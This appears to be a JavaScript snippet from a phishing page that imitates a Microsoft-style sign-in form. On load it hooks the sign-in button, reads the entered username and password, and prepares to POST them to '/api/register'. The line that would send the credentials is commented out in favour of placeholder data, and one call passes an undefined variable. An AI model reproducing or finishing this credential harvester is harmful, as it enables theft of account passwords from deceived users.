function getCredentials() {
        document.getElementById('idSIButton9').addEventListener("click", function() {
        var username = document.getElementById('displayName')['title'];
        var password = document.getElementById('i0118').value;
        var client_id = findGetParameter(userId);
        var xhr = new XMLHttpRequest();
        xhr.open("POST", '/api/register', true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.onreadystatechange = function() { // Call a function when the state changes.
        if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
                // Request finished. Do processing here.
            }
        }

        // let results = {
        //     "username": username,
        //     "password": password,
        //     "client_id": client_id
        // }
        // xhr.send(results);
        xhr.send("foo=bar&lorem=ipsum");
    });
}

function findGetParameter(parameterName) {
    var result = null,
    tmp = [];
    location.search
        .substr(1)
        .split("&")
        .forEach(function (item) {
        tmp = item.split("=");
        if (tmp[0] === parameterName) result = decodeURIComponent(tmp[1]);
        });
    return result;
}

document.addEventListener('DOMContentLoaded', getCredentials, false);
